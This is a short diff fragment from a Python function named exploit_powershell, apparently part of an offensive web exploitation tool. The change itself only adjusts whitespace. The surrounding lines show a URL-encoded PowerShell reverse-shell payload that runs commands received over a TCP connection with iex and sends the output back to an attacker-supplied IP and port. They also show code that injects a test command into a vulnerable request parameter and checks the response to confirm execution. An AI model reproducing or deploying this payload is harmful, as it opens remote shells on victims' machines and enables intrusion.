@@ -17,10 +17,10 @@ def exploit_powershell(exploit, method, ip, port):
                          "+%3d+(New-Object+-TypeName+System.Text.ASCIIEncoding).GetString($bytes,0,+$i)%3b$sendback+%3d+(iex+$data+2>%261+|+Out-String+)%3b$"\
                          "sendback2+%3d+$sendback+%2b+'PS+'+%2b+(pwd).Path+%2b+'>+'%3b$sendbyte+%3d+([text.encoding]%3a%3aASCII).GetBytes($sendback2)%3b$stream"\
                          ".Write($sendbyte,0,$sendbyte.Length)%3b$stream.Flush()}%3b$client.Close()\" "
-    
+
     powershellPayload = powershellPayload.replace("{IP}", ip)
     powershellPayload = powershellPayload.replace("{PORT}", str(port))
-    
+
     if(method == "INPUT"):
         res, _ = request.REQUEST(url.replace(config.tempArg, encode(powershellTest)), args.httpheaders, post, config.proxies, "", "", exploit =  True)
         if("Windows IP Configuration" in res.text):
